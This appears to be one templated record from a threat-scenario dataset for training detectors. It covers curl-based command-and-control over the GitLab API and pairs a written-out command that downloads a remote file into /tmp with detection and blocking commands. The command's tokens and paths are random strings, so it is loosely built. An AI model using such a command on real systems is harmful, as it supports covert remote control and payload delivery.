---
type: campaign
scenario_id: 402
tactic: Command and Control
technique: "T1071.001: Application Layer Protocol: Web Protocols"
technique_id: T1071.001
tags: [campaign, lotl, command_and_control]
---

# Using curl to communicate with GitLab API for C2.

## Threat Description
Using curl to communicate with GitLab API for C2.

## Attack Command
```
curl -H "Authorization: Bearer $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 32)" https://gitlab.com/api/v4/projects/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)/repository/files/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt/raw -o /tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt
```

## Detection Logic
Monitor curl GitLab: `ps aux | grep curl | grep gitlab.com`; Network traffic: `tcpdump -i any host gitlab.com`.

## Mitigation
Restrict curl: `chmod 700 /usr/bin/curl`; Block GitLab API: `iptables -A OUTPUT -d gitlab.com -j DROP`.

## AI Training Prompt
Train AI to detect curl-based C2 via GitLab API by analyzing HTTP headers, GitLab API endpoints, and file creation patterns; recommend API blocking.

## References
- MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
